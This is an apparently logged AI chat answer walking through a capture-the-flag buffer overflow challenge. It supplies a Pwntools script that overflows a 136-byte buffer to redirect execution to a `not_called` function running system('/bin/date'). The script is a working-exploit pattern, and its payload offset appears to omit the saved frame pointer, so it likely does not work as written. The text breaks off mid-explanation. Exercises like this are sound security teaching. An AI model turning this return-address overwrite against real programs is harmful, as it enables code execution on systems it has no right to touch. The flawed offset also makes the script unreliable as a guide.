AIMessage(content='To solve this challenge using Pwntools, you will need to exploit the vulnerability in the `vulnerable_function`, which allows for a buffer overflow due to reading more bytes than the allocated buffer size. The buffer is defined as `char buf[136]`, but the `read` function is called with a size of `0x100` (256 bytes), which can lead to a buffer overflow.\n\nHere’s how you can approach the solution:\n\n1. **Identify the Vulnerability**: The `vulnerable_function` reads 256 bytes into a 136-byte buffer, which can overwrite adjacent memory, including the return address of the function.\n\n2. **Craft the Payload**: You will need to create a payload that fills the buffer and overwrites the return address with the address of a function you want to execute (for example, the `not_called` function which executes `system("/bin/date")`).\n\n3. **Use Pwntools to Interact with the Binary**: You can use Pwntools to create a script that interacts with the binary, sends the payload, and receives the output.\n\nHere’s a sample script using Pwntools to exploit the vulnerability:\n\n```python\n# Prefix: This script uses Pwntools to exploit the buffer overflow vulnerability in the provided binary.\n\nfrom pwn import *\n\n# Set up the process or remote connection\n# If running locally, use `process(\'./your_binary\')`\n# If running on a remote server, use `remote(\'hostname\', port)`\np = process(\'./your_binary\')\n\n# Address of the function to call (you need to find this using a disassembler or debugger)\n# For example, let\'s assume the address of `not_called` is 0x080484A4\nnot_called_address = 0x080484A4\n\n# Create the payload\n# Fill the buffer (136 bytes) and overwrite the return address (4 bytes)\npayload = b\'A\' * 136 + p32(not_called_address)\n\n# Send the payload\np.sendline(payload)\n\n# Interact with the process to see the output\np.interactive()\n```\n\n### Explanation of the Code:\n1. **Imports**: The script imports the `pwn` module from Pwntools.\n2. **Process Setup**: It sets up a process to run the binary.
